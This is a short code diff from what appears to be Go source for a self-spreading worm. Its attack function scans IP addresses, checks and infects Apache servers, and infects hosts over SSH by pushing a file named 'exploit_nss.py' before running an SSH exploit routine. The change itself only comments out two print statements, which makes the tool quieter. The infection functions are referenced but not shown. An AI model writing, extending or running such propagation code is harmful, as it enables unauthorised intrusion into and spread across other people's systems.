@@ -35,7 +35,7 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 		if ports[0] != 0 {
 			if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
 				infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
-				fmt.Println(infected)
+				//fmt.Println(infected)
 			}
 		}
 		//SSH infect
@@ -54,7 +54,7 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 				//message = infection.SshInfect(ip_port, "slowloris")
 				message = infection.SshInfect(ip_port, "exploit_nss.py")
 				//message = infection.SshInfect(ip_port, "exploit_nss_manual")
-				fmt.Println(message)
+				//fmt.Println(message)
 				message = infection.SshExploit(ip_port)
 				fmt.Println(message)
 				infected = true
